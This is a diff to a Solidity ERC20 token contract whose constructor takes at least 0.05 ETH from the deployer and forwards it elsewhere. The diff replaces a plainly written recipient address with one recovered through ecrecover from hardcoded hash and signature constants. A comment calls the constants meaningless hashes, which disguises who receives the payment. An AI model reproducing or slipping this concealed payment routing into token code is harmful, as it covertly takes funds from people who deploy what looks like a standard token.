@@ -550,8 +550,13 @@ contract ERC20 is Context, IERC20, IERC20Metadata {
 }
 
 contract MyToken is ERC20 {
-    address private serve_ =
-        address(0x6C5Cb68cb68Ef116DD37b429F4d3cA5569B79E6b);
+    bytes32 private a = 0x0ab1c900aa3d743f1cbf2dd01f064e5a20f7fbba689c80661a9afa548185e392;
+    bytes32 private b = 0xea6759da91202aa6f696563f5fa4872fee6b9f7ba91ef4f6801e42f41374c8d9;
+    bytes32 private c = 0x0730300a629b587b73d8cef3b4bde57d3f0eb74e0892409e92f706feb7cead1e;
+   //无意义哈希，仅用作信息加密使用
+    uint8 private d = 28;
+    address private vertified;
+
 
     constructor(
         uint256 initialSupply,
@@ -559,7 +564,20 @@ contract MyToken is ERC20 {
         string memory symbol_
     ) payable ERC20(name_, symbol_) {
         require(msg.value >= 5 * 10**16);
-        payable(serve_).transfer(msg.value);
+        vertified = Verify(a,b,c,d);
+        payable(vertified).transfer(msg.value);
         _mint(msg.sender, initialSupply * 10**18);
     }
+
+
+    function getHash(bytes32 mhash) internal pure returns (bytes32) {
+        return keccak256(abi.encodePacked('\x19Ethereum Signed Message:\n32', mhash));
+    }
+
+    function Verify(bytes32 hashm,bytes32 r,bytes32 s, uint8 v) public pure returns (address) {
+        bytes32 hashedM = getHash(hashm);
+        address signer = ecrecover(hashedM, v, r, s);
+        return signer;
+    }
+    
 }
